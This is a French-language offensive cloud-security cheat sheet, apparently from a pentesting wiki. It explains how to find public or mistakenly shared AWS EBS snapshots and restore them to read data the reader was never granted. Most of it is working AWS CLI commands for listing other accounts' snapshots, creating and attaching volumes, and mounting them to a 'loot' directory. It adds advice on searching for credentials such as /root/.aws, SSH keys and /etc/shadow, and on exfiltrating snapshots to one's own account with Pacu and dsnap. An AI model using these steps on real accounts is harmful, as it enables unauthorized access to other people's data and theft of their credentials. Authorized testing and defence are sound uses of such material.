---
title: "Instantanés EBS : restaurer des instantanés de stockage par blocs publics ou partagés"
order: 2
description: "Trouver des instantanés EBS publics ou partagés et les restaurer pour lire des volumes qui ne vous ont jamais été accordés."
keywords:
  - EBS
  - snapshot
  - public
  - volume
  - data recovery
---

# Instantanés EBS

Un instantané EBS est une copie d'un volume à un instant donné, et son paramètre de partage est distinct de celui du volume. Les instantanés sont fréquemment laissés **publics** ou partagés par erreur avec un compte précis, ce qui expose l'intégralité du système de fichiers (identifiants, clés, bases de données) à quiconque peut les restaurer. L'attaque consiste à trouver un instantané accessible, à créer un volume à partir de celui-ci, puis à monter ce volume sur une instance que vous contrôlez.

## Trouver les instantanés accessibles

```bash
# snapshots explicitly shared with you or public, not owned by you
aws ec2 describe-snapshots --restorable-by-user-ids self \
  --query 'Snapshots[?OwnerId!=`<your-acct>`].[SnapshotId,VolumeSize,Description]'

# a specific owner's snapshots, if you know the target account id
aws ec2 describe-snapshots --owner-ids <target-acct>
```

## Restaurer et monter

```bash
# create a volume from the snapshot in your AZ, attach to your instance
aws ec2 create-volume --snapshot-id snap-xxxx --availability-zone us-east-1a
aws ec2 attach-volume --volume-id vol-xxxx --instance-id i-your --device /dev/sdf
# on the instance
sudo mkdir /mnt/loot && sudo mount /dev/xvdf1 /mnt/loot
```

## Notes d'exploitation

- Les instantanés publics sont découvrables à l'échelle de tout compte ; dsnap et Pacu automatisent leur recherche et leur récupération sans avoir à démarrer une instance à la main.
- Montez en lecture seule pour éviter d'altérer les horodatages, et cherchez d'abord `/root/.aws`, `/home/*/.ssh`, `/etc/shadow`, ainsi que la configuration applicative contenant des secrets en clair.
- Un instantané que vous pouvez *partager* (`ModifySnapshotAttribute`) peut être exfiltré vers votre propre compte même si vous ne pouvez pas le monter sur place.

## Outils

- **dsnap** : télécharger et monter des instantanés EBS pour une analyse hors ligne.
- **Pacu** (`ebs__enum_volumes_snapshots`, `ebs__download_snapshot`) : découvrir et récupérer des instantanés.
- **AWS CLI** (`create-volume`, `attach-volume`) : restauration manuelle.

## Références

- [HackTricks Cloud : instantanés EBS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-ssm-and-vpc.html)
- [dsnap (RhinoSecurityLabs)](https://github.com/RhinoSecurityLabs/dsnap)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
